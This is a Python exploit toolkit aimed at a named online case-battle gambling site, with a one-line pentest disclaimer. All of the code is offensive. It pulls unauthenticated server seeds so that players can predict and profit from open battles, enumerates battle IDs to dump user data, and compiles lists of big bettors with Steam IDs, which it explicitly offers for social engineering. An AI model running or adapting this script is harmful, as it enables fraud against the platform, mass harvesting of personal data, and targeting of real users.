#!/usr/bin/env python3
"""
KEY-DROP.COM EXPLOIT TOOLKIT
=============================
Exploits IDOR and data exposure vulnerabilities in key-drop.com

VULNERABILITIES EXPLOITED:
1. Unauthenticated API access to game data
2. Server seed exposure (breaks provably fair)
3. Mass user data enumeration
4. Real-time whale tracking

DISCLAIMER: For authorized penetration testing only.

Author: Pentest Team
Date: 2026-01-07
"""

import requests
import json
import time
import sys
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Configuration
API_BASE = "https://key-drop.app"
SITE_BASE = "https://key-drop.com"
OUTPUT_DIR = "/home/l0ve/pen-test/key-drop.com/exploits/loot"

# Create output directory
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Headers to mimic browser
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Origin": "https://key-drop.com",
    "Referer": "https://key-drop.com/",
    "Accept": "application/json",
}


class KeyDropExploit:
    """Main exploit class for Key-Drop vulnerabilities"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(HEADERS)
        self.whales = []  # High-value players
        self.battles = []  # Collected battle data
        self.seeds = {}   # Server seeds collected

    def log(self, msg, level="*"):
        """Colored logging"""
        colors = {"*": "\033[94m", "+": "\033[92m", "-": "\033[91m", "!": "\033[93m", "$": "\033[95m"}
        reset = "\033[0m"
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{colors.get(level, '')}{level}{reset} [{timestamp}] {msg}")

    # ==================== EXPLOIT 1: LIVE BATTLE SCRAPER ====================

    def scrape_live_battles(self, limit=100):
        """
        Scrape all active battles with full data exposure
        Returns: List of battles with user data, bets, cases
        """
        self.log("Scraping live battles...", "*")

        url = f"{API_BASE}/v2/battle"
        params = {
            "type": "active",
            "limit": limit,
            "cursor": 0,
            "priceFrom": 0,
            "priceTo": 999999,
            "sort": "latest"
        }

        try:
            resp = self.session.get(url, params=params, timeout=30)
            data = resp.json()

            if "data" in data:
                battles = data["data"]
                self.log(f"Found {len(battles)} active battles", "+")

                # Extract high-value battles
                for battle in battles:
                    cost = battle.get("cost", 0)
                    if cost >= 100:  # $100+ battles
                        self.log(f"HIGH VALUE: ${cost} battle (ID: {battle['id']})", "$")
                        self.battles.append(battle)

                        # Extract whale users
                        for user in battle.get("users", []):
                            if not user.get("isBot"):
                                self.whales.append({
                                    "id": user.get("id"),
                                    "username": user.get("username"),
                                    "steamId": user.get("idSteam"),
                                    "avatar": user.get("steamAvatar"),
                                    "bet": cost,
                                    "borrow": user.get("borrow", 0)
                                })

                return battles
        except Exception as e:
            self.log(f"Error: {e}", "-")
            return []

    # ==================== EXPLOIT 2: SERVER SEED EXTRACTOR ====================

    def extract_server_seed(self, battle_id):
        """
        Extract server seed from any battle (CRITICAL VULNERABILITY)
        This breaks the "provably fair" system
        """
        url = f"{API_BASE}/CaseBattle/gameFullData/{battle_id}"

        try:
            resp = self.session.get(url, timeout=10)
            data = resp.json()

            if data.get("success") and "data" in data:
                game = data["data"]
                seed = game.get("serverSeed")
                status = game.get("status")

                if seed:
                    self.seeds[battle_id] = {
                        "serverSeed": seed,
                        "status": status,
                        "cost": game.get("cost"),
                        "wonSteamId": game.get("wonSteamId"),
                        "createdAt": game.get("createdAt")
                    }
                    return seed, game

        except Exception as e:
            pass
        return None, None

    def mass_seed_extraction(self, start_id, count=1000, threads=10):
        """
        Mass extract server seeds from multiple battles
        Can be used to analyze patterns or predict outcomes
        """
        self.log(f"Mass extracting seeds from {count} battles starting at ID {start_id}...", "*")

        extracted = 0

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(self.extract_server_seed, start_id + i): start_id + i
                for i in range(count)
            }

            for future in as_completed(futures):
                battle_id = futures[future]
                try:
                    seed, game = future.result()
                    if seed:
                        extracted += 1
                        if extracted % 100 == 0:
                            self.log(f"Extracted {extracted} seeds...", "+")
                except:
                    pass

        self.log(f"Total seeds extracted: {extracted}", "+")
        return self.seeds

    # ==================== EXPLOIT 3: WHALE HUNTER ====================

    def hunt_whales(self, min_bet=500):
        """
        Find high-value players (whales) betting large amounts
        Useful for: Social engineering, competitor intelligence
        """
        self.log(f"Hunting whales (min bet: ${min_bet})...", "$")

        # Scrape recent battles
        battles = self.scrape_live_battles(limit=500)

        whale_list = []
        if not battles:
            battles = []

        for battle in battles:
            cost = battle.get("cost", 0)
            if cost >= min_bet:
                for user in battle.get("users", []):
                    if not user.get("isBot"):
                        whale_data = {
                            "username": user.get("username"),
                            "steamId": user.get("idSteam"),
                            "steamProfile": f"https://steamcommunity.com/profiles/{user.get('idSteam')}",
                            "bet": cost,
                            "battleId": battle.get("id"),
                            "borrow_percent": user.get("borrow", 0),
                        }
                        whale_list.append(whale_data)
                        self.log(f"WHALE: {user.get('username')} betting ${cost}", "$")

        # Save whales to file
        whale_file = f"{OUTPUT_DIR}/whales_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(whale_file, 'w') as f:
            json.dump(whale_list, f, indent=2)
        self.log(f"Saved {len(whale_list)} whales to {whale_file}", "+")

        return whale_list

    # ==================== EXPLOIT 4: BATTLE HISTORY DUMPER ====================

    def dump_battle_history(self, start_id, end_id, output_file=None):
        """
        Dump complete battle history with all sensitive data
        Includes: users, bets, outcomes, seeds, items won
        """
        self.log(f"Dumping battles from {start_id} to {end_id}...", "*")

        if output_file is None:
            output_file = f"{OUTPUT_DIR}/battle_dump_{start_id}_{end_id}.json"

        battles = []

        for battle_id in range(start_id, end_id + 1):
            seed, game = self.extract_server_seed(battle_id)
            if game:
                battles.append(game)

                if len(battles) % 100 == 0:
                    self.log(f"Dumped {len(battles)} battles...", "+")
                    # Save progress
                    with open(output_file, 'w') as f:
                        json.dump(battles, f)

            time.sleep(0.1)  # Rate limiting

        with open(output_file, 'w') as f:
            json.dump(battles, f, indent=2)

        self.log(f"Dumped {len(battles)} battles to {output_file}", "+")
        return battles

    # ==================== EXPLOIT 5: PROFIT FINDER ====================

    def find_profitable_battles(self):
        """
        Find battles where you can predict the winner
        Based on exposed server seeds and game data
        """
        self.log("Analyzing battles for profit opportunities...", "$")

        # Get active battles
        url = f"{API_BASE}/v2/battle"
        params = {"type": "active", "limit": 50}

        try:
            resp = self.session.get(url, params=params, timeout=30)
            battles = resp.json().get("data", [])

            profitable = []

            for battle in battles:
                battle_id = battle.get("id")
                status = battle.get("status")
                cost = battle.get("cost", 0)
                users = battle.get("users", [])
                max_users = battle.get("maxUserCount", 0)

                # Check if battle has open slots
                open_slots = max_users - len(users)

                if open_slots > 0 and status == "new":
                    # Try to get server seed
                    seed, full_data = self.extract_server_seed(battle_id)

                    if seed and full_data.get("status") == "new":
                        profitable.append({
                            "id": battle_id,
                            "cost": cost,
                            "openSlots": open_slots,
                            "serverSeed": seed,  # LEAKED!
                            "currentPlayers": len(users),
                            "cases": battle.get("cases", [])
                        })
                        self.log(f"EXPLOITABLE: Battle {battle_id} - ${cost} - Seed: {seed[:10]}...", "$")

            # Save profitable battles
            profit_file = f"{OUTPUT_DIR}/profitable_battles.json"
            with open(profit_file, 'w') as f:
                json.dump(profitable, f, indent=2)

            self.log(f"Found {len(profitable)} potentially exploitable battles", "+")
            return profitable

        except Exception as e:
            self.log(f"Error: {e}", "-")
            return []

    # ==================== EXPLOIT 6: USER ENUMERATOR ====================

    def enumerate_users(self, count=10000):
        """
        Enumerate all users from battle history
        Builds database of: usernames, Steam IDs, betting patterns
        """
        self.log(f"Enumerating users from {count} battles...", "*")

        users_db = {}

        # Get latest battle ID
        resp = self.session.get(f"{API_BASE}/v2/battle", params={"type": "active", "limit": 1})
        latest = resp.json().get("data", [{}])[0].get("id", 50000000)

        self.log(f"Latest battle ID: {latest}", "+")

        # Enumerate backwards
        for battle_id in range(latest, latest - count, -1):
            seed, game = self.extract_server_seed(battle_id)

            if game:
                for user in game.get("users", []):
                    steam_id = user.get("idSteam")
                    if steam_id and not user.get("isBot"):
                        if steam_id not in users_db:
                            users_db[steam_id] = {
                                "steamId": steam_id,
                                "username": user.get("username"),
                                "avatar": user.get("steamAvatar"),
                                "totalBets": 0,
                                "battles": []
                            }

                        users_db[steam_id]["totalBets"] += game.get("cost", 0)
                        users_db[steam_id]["battles"].append(battle_id)

            if battle_id % 500 == 0:
                self.log(f"Progress: {latest - battle_id}/{count} - Found {len(users_db)} unique users", "+")

            time.sleep(0.05)

        # Sort by total bets
        sorted_users = sorted(users_db.values(), key=lambda x: x["totalBets"], reverse=True)

        # Save
        users_file = f"{OUTPUT_DIR}/users_database.json"
        with open(users_file, 'w') as f:
            json.dump(sorted_users, f, indent=2)

        self.log(f"Enumerated {len(sorted_users)} users. Saved to {users_file}", "+")

        # Print top 10 whales
        self.log("TOP 10 BIGGEST BETTORS:", "$")
        for i, user in enumerate(sorted_users[:10], 1):
            self.log(f"  {i}. {user['username']} - ${user['totalBets']:.2f} total", "$")

        return sorted_users

    # ==================== MAIN EXECUTION ====================

    def run_all(self):
        """Run all exploits"""
        print("""
╔═══════════════════════════════════════════════════════════════╗
║           KEY-DROP.COM EXPLOIT TOOLKIT v1.0                  ║
║                                                               ║
║  [1] Scrape Live Battles                                      ║
║  [2] Extract Server Seeds (Breaks Provably Fair)              ║
║  [3] Hunt Whales ($500+ bettors)                              ║
║  [4] Find Profitable/Exploitable Battles                      ║
║  [5] Enumerate All Users                                      ║
║  [6] Dump Battle History                                      ║
║  [7] Run All Exploits                                         ║
║  [0] Exit                                                     ║
╚═══════════════════════════════════════════════════════════════╝
        """)

        while True:
            try:
                choice = input("\n[?] Select exploit (0-7): ").strip()

                if choice == "0":
                    self.log("Exiting...", "*")
                    break
                elif choice == "1":
                    self.scrape_live_battles()
                elif choice == "2":
                    start = int(input("[?] Start battle ID: ") or "51000000")
                    count = int(input("[?] Number of battles: ") or "100")
                    self.mass_seed_extraction(start, count)
                elif choice == "3":
                    min_bet = int(input("[?] Minimum bet ($): ") or "500")
                    self.hunt_whales(min_bet)
                elif choice == "4":
                    self.find_profitable_battles()
                elif choice == "5":
                    count = int(input("[?] Number of battles to scan: ") or "1000")
                    self.enumerate_users(count)
                elif choice == "6":
                    start = int(input("[?] Start battle ID: ") or "51000000")
                    end = int(input("[?] End battle ID: ") or "51001000")
                    self.dump_battle_history(start, end)
                elif choice == "7":
                    self.log("Running all exploits...", "!")
                    self.scrape_live_battles()
                    self.hunt_whales(100)
                    self.find_profitable_battles()
                    self.mass_seed_extraction(51800000, 500)
                    self.log("All exploits completed!", "+")
                else:
                    self.log("Invalid choice", "-")

            except KeyboardInterrupt:
                self.log("\nInterrupted by user", "!")
                break
            except Exception as e:
                self.log(f"Error: {e}", "-")


def quick_exploit():
    """Quick one-liner exploit for immediate results"""
    exploit = KeyDropExploit()

    print("\n[*] QUICK EXPLOIT MODE")
    print("[*] Fetching high-value data...\n")

    # Get latest battles with exposed data
    battles = exploit.scrape_live_battles(50)

    # Find profitable ones
    profitable = exploit.find_profitable_battles()

    # Hunt whales
    whales = exploit.hunt_whales(100)

    print(f"\n[+] Results saved to: {OUTPUT_DIR}")
    print(f"[+] Battles scraped: {len(battles)}")
    print(f"[+] Exploitable battles: {len(profitable)}")
    print(f"[+] Whales found: {len(whales)}")


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--quick":
        quick_exploit()
    else:
        exploit = KeyDropExploit()
        exploit.run_all()
